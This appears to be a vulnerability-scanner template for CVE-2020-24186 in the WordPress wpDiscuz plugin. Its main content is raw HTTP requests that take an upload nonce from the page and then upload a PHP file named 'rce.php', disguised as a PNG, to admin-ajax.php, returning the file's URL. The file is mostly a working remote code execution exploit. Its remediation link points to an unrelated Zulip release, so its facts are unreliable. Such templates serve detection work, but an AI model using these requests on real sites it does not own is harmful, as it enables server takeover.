id: CVE-2020-24186
info:
  name: WordPress wpDiscuz <=7.0.4 - Remote Code Execution
  author:
  - l0ne1y
  tags:
  - cve
  - cve2020
  - wordpress
  - wp-plugin
  - rce
  - upload
  description: |-
    WordPress Plugin wpDiscuz 任意文件上传漏洞
    WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。

    WordPress wpDiscuz 7.0.4之前版本中存在远程代码执行漏洞，该漏洞允许攻击者上传任意文件。.
  reference:
  - https://github.com/suncsr/wpdiscuz_unauthenticated_arbitrary_file_upload/blob/main/readme.md
  - https://nvd.nist.gov/vuln/detail/cve-2020-24186
  - https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/
  - http://packetstormsecurity.com/files/162983/wordpress-wpdiscuz-7.0.4-shell-upload.html
  severity: critical
  classification:
    cve-id:
    - cve-2020-24186
    cwe-id:
    - cwe-434
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://blog.zulip.com/2020/06/17/zulip-server-2-1-5-security-release/
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    condition: and
    part: body
    words:
    - success":true
    - fullname
    - shortname
    - url
  extractors:
  - name: wmuSecurity
    type: regex
    regex:
    - wmuSecurity":"([a-z0-9]+)
    group: 1
    part: body
    internal: true
  - type: regex
    regex:
    - '"url":"([a-z:\\/0-9-.]+)"'
    group: 1
    part: body
  matchers-condition: and
  raw:
  - |
    GET /?p=1 HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
  - |
    POST /wp-admin/admin-ajax.php HTTP/1.1
    Host: {{Hostname}}
    X-Requested-With: XMLHttpRequest
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary88AhjLimsDMHU1Ak
    Origin: {{BaseURL}}
    Referer: {{BaseURL}}

    ------WebKitFormBoundary88AhjLimsDMHU1Ak
    Content-Disposition: form-data; name="action"

    wmuUploadFiles
    ------WebKitFormBoundary88AhjLimsDMHU1Ak
    Content-Disposition: form-data; name="wmu_nonce"

    {{wmuSecurity}}
    ------WebKitFormBoundary88AhjLimsDMHU1Ak
    Content-Disposition: form-data; name="wmuAttachmentsData"

    undefined
    ------WebKitFormBoundary88AhjLimsDMHU1Ak
    Content-Disposition: form-data; name="wmu_files[0]"; filename="rce.php"
    Content-Type: image/png

    {{base64_decode('/9j/4WpFeGlmTU0q/f39af39Pv39/f39/f39/f2o/f39/cD9/f39/f39/f39/f/g/UpGSUb9/f39/9tD/f0M/QwK/f0=')}}
    <?php phpinfo();?>
    ------WebKitFormBoundary88AhjLimsDMHU1Ak
    Content-Disposition: form-data; name="postId"

    1
    ------WebKitFormBoundary88AhjLimsDMHU1Ak--
